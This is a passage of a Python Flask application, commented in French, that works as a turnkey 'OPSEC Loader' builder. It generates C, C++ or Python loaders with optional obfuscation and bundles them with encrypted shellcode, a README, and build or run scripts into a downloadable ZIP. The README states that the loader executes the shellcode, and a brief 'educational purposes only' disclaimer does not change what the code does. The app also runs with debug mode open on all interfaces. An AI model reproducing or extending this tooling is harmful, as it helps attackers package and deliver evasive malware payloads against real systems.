        # Formater la clé pour le loader si demandé
        formatted_key = None
        if format_key:
            try:
                sys.path.append(framework_path)
                from key_formatter_ import format_key as key_formatter
                
                # Convertir la clé en format hexadécimal
                hex_key = key.hex()
                formatted_key, _ = key_formatter(hex_key, loader_type, add_info=True)
            except Exception as e:
                flash(f"Avertissement: Erreur lors du formatage de la clé: {str(e)}", 'warning')
                formatted_key = None
        
        # Générer le code du loader
        try:
            if loader_type == "cpp":
                loader_code = generate_cpp_loader(encryption_method, apply_obfuscation, formatted_key)
            elif loader_type == "c":
                loader_code = generate_c_loader(encryption_method, apply_obfuscation, formatted_key)
            elif loader_type == "python":
                loader_code = generate_python_loader(encryption_method, apply_obfuscation, formatted_key)
            else:
                loader_code = generate_cpp_loader(encryption_method, apply_obfuscation, formatted_key)
            
            # Sauvegarder le loader
            with open(loader_path, 'w') as f:
                f.write(loader_code)
        
        except Exception as e:
            flash(f"Erreur lors de la génération du loader: {str(e)}", 'danger')
            return redirect(url_for('index'))
        
        # Étape 5: Créer un fichier ZIP avec tous les éléments
        zip_path = os.path.join(app.config['GENERATED_FILES'], f"{operation_id}.zip")
        try:
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                # Ajouter les fichiers au ZIP
                zipf.write(encrypted_path, os.path.basename(encrypted_path))
                zipf.write(loader_path, os.path.basename(loader_path))
                
                # Ajouter un README avec les instructions
                readme_content = f"""
# OPSEC Loader - Système Clé en Main

## Contenu du package
- `{os.path.basename(encrypted_path)}`: Shellcode chiffré
- `{os.path.basename(loader_path)}`: Loader pour exécuter le shellcode

## Instructions
1. Compilez le loader avec les options appropriées
   - Pour C/C++: `gcc -o loader {os.path.basename(loader_path)}` ou équivalent
   - Pour Python: `python {os.path.basename(loader_path)}`
2. Exécutez le loader en fournissant le mot de passe: `./loader {os.path.basename(encrypted_path)} {password}`

## Informations techniques
- Méthode de chiffrement: {encryption_method}
- Vérification d'intégrité HMAC: {"Activée" if verify_integrity else "Désactivée"}
- Obfuscation: {"Activée" if apply_obfuscation else "Désactivée"}

Générée le: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
Identifiant unique: {operation_id}

## Avertissement
Ce package est fourni à des fins éducatives uniquement. L'utilisation de ce logiciel doit être conforme
aux lois et réglementations en vigueur dans votre juridiction. L'auteur n'est pas responsable de toute
utilisation abusive de cet outil.
"""
                zipf.writestr("README.md", readme_content)
                
                # Ajouter un script de déploiement rapide
                if loader_type in ["c", "cpp"]:
                    build_script = f"""#!/bin/bash
# Script de compilation rapide
echo "Compilation du loader OPSEC..."
gcc -o opsec_loader {os.path.basename(loader_path)} -lcrypto -lpthread
if [ $? -eq 0 ]; then
    echo "Compilation réussie!"
    echo "Exécutez avec: ./opsec_loader {os.path.basename(encrypted_path)} {password}"
else
    echo "Erreur de compilation. Assurez-vous que les bibliothèques requises sont installées."
    echo "Sur Ubuntu/Debian: sudo apt-get install libssl-dev"
fi
"""
                    zipf.writestr("build.sh", build_script)
                
                elif loader_type == "python":
                    run_script = f"""#!/bin/bash
# Script d'exécution rapide
echo "Exécution du loader OPSEC..."
python {os.path.basename(loader_path)} {os.path.basename(encrypted_path)} {password}
"""
                    zipf.writestr("run.sh", run_script)
        
        except Exception as e:
            flash(f"Erreur lors de la création du package ZIP: {str(e)}", 'danger')
            return redirect(url_for('index'))
        
        # Étape 6: Renvoyer le fichier ZIP à l'utilisateur
        return send_file(
            zip_path,
            as_attachment=True,
            download_name=f"opsec_loader_package.zip",
            mimetype='application/zip'
        )
    
    except Exception as e:
        flash(f"Erreur interne du système: {str(e)}", 'danger')
        return redirect(url_for('index'))


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)